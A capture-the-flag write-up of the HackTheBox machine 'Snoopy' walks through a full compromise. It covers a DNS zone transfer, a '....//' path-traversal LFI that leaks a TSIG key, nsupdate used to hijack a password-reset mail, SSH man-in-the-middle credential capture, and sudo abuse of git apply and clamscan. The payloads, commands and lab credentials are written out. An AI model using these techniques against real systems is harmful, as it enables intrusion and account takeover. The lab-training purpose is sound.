---
layout: post
title: "HTB: Snoopy"
subtitle: "zone transfer plus path-traversal LFI to the rndc key, DNS hijack into a Mattermost password reset, SSH MITM for creds, then git apply and clamscan for root"
date: 2023-07-14
tags: [htb, linux, dns, lfi, ssh-mitm, sudo]
category: writeups
tldr: "A BIND zone transfer and a preg_replace path-traversal LFI gave me the rndc TSIG key. I used nsupdate to repoint mail.snoopy.htb at my box, caught a Mattermost reset token over a debug SMTP server, and reset sbrown. A /server_provision command triggered an outbound SSH that I MITM'd for cbrown creds. cbrown -> sbrown via sudo git apply of a crafted diff, sbrown -> root via sudo clamscan file read."
---

## the box

Snoopy is a Linux box running SSH on 22, BIND on 53, and nginx 1.18.0 on 80. The site is a corporate template for `snoopy.htb` with a `/download` endpoint and a team listing that leaks employee emails.

## recon

nmap showed the DNS port open, with `bind.version` reporting `9.18.12-0ubuntu0.22.04.1-Ubuntu`. The site advertised a mailserver `mail.snoopy.htb` as "currently offline", and gobuster pulled `/download`, `/assets`, `/forms`. Fuzzing the vhost found `mm.snoopy.htb`.

A full zone transfer worked:

```bash
dig axfr snoopy.htb @10.129.84.147
```

```
mattermost.snoopy.htb.  86400 IN A 172.18.0.3
mm.snoopy.htb.          86400 IN A 127.0.0.1
ns1.snoopy.htb.         86400 IN A 10.0.50.10
postgres.snoopy.htb.    86400 IN A 172.18.0.2
provisions.snoopy.htb.  86400 IN A 172.18.0.4
```

The `/download` endpoint took a `file` parameter. It strips `../` with a single non-recursive `preg_replace`, so `....//` collapses back to `../` after one pass:

```
http://snoopy.htb/download?file=....//....//....//....//....//....//....//etc/passwd
```

That read `/etc/passwd` (users cbrown, sbrown, lpelt, cschultz, vgray) and the nginx config. Reading `download.php` confirmed the bypass:

```php
$content = preg_replace('/\.\.\//', '', $file);
```

## foothold

The same LFI read `/etc/bind/named.conf`, which carried the rndc TSIG key:

```
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};

zone "snoopy.htb" IN {
    type master;
    allow-update { key "rndc-key"; };
};
```

With an update key I could rewrite DNS records. The plan: point `mail.snoopy.htb` at my box, run a debug SMTP server, then trigger a Mattermost password reset so the reset mail comes to me.

I started a local SMTP debugging server and added the record with nsupdate:

```bash
sudo python3 -m smtpd -n -c DebuggingServer <my-ip>:25
```

```bash
nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="
> server 10.10.11.212
> update add mail.snoopy.htb. 900 IN A 10.10.16.4
> send
```

Requesting a reset for sbrown at `mm.snoopy.htb` dropped the token into my SMTP console, quoted-printable encoded. The `3D` and trailing `=` are encoding artifacts, so I stripped them:

```
http://mm.snoopy.htb/reset_password_complete?token=zean7dgi358ph8mqpogpwt3epcnrq5hhbcj6wu3czw8wnokwes9xi1wgybj74qtu
```

That set sbrown's password and logged me into Mattermost.

## user

Inside Mattermost there was a slash command, `/server_provision`, asking for email, department, OS, and a server IP. Supplying it made the box open an outbound SSH connection back to the IP I gave. A plain listener only showed the paramiko banner:

```
Connection from 10.10.11.212:60582
SSH-2.0-paramiko_3.1.0
```

Command injection in the IP field went nowhere, so I sat in the middle with sshmitm instead. I pointed `/server_provision` at my listener and proxied to the box:

```bash
python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222
```

The provisioning client authenticated through me and handed over its creds:

```
Username: cbrown
Password: sn00pedcr3dential!!!
```

SSH in as cbrown.

## root

cbrown's sudo rule let cbrown run `git apply` as sbrown:

```
(sbrown) PASSWD: /usr/bin/git apply *
```

`git apply` writes files as the target user. I built a diff that adds my public key to sbrown's `authorized_keys`, then applied it:

```bash
cd /home
git diff cbrown/.bash_history cbrown/.ssh/authorized_keys > /tmp/diff
# edit /tmp/diff: rewrite cbrown -> sbrown, insert my pubkey
chmod 777 /home/cbrown
sudo -u sbrown /usr/bin/git apply /tmp/diff
```

SSH in as sbrown for the user flag. sbrown then had a clean NOPASSWD rule:

```
(root) NOPASSWD: /usr/local/bin/clamscan
```

clamscan's `-f` flag scans a file list and echoes each line it reads back in its output, so it doubles as an arbitrary root file read:

```bash
sudo /usr/local/bin/clamscan -f /root/root.txt
```

The scan printed the flag content as a "No such file or directory" entry, which was the root flag.

## takeaway

Every step here is a misuse of legitimate functionality. A permissive zone transfer leaked infrastructure, a non-recursive `preg_replace` filter handed over a TSIG key, dynamic DNS plus an attacker-pointed mailserver hijacked a reset flow, and the privesc chain is two GTFOBins-style sudo entries. `git apply` and `clamscan -f` both turn a narrow grant into write or read as another user.
